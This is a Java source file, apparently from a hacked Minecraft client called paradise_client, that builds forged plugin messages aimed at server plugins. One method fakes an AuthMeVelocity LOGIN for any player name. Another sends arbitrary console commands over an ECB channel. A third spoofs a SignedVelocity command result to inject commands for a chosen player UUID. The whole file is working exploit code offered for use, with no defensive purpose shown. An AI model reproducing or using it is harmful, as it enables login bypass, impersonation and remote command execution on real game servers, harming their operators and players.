package net.paradise_client;

import net.minecraft.client.MinecraftClient;

public class PacketFactory {
  public static void sendAMV(String name) {
    Helper.sendPluginMessage("authmevelocity:main", out -> {
      out.writeUTF("LOGIN");
      out.writeUTF(name);
    });
  }

  public static void sendECB(String command) {
    Helper.sendPluginMessage("ecb:channel", out -> {
      out.writeUTF("ActionsSubChannel");
      out.writeUTF("console_command: " + command);
    });
  }

  public static void sendSV(String uuid, String command) {
    Helper.sendPluginMessage("signedvelocity:main", out -> {
      out.writeUTF(uuid);
      out.writeUTF("COMMAND_RESULT");
      out.writeUTF("MODIFY");
      out.writeUTF("/" + command);
    });
  }
}
